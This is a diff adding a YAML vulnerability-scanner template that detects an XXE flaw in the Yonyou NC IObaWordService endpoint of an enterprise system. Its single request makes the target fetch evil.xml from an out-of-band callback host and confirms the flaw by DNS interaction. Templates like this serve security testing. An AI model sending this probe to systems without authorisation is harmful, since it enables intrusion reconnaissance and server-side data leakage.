@@ -1,0 +1,24 @@
+id: poc-yaml-yongyou-iobawordservice-xxe
+info:
+  name: 用友NC IObaWordService接口存在xml外部实体注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: DNSLOG,xxe
+  description: |
+    用友NC IObaWordService接口存在xml外部实体注入漏洞，可能导致敏感信息泄露或其他严重安全问题。
+
+http:
+  - raw:
+      - |
+        GET /uapws/service/nc.itf.bap.oba.IObaWordService?xsd=http://{{interactsh-url}}/evil.xml HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
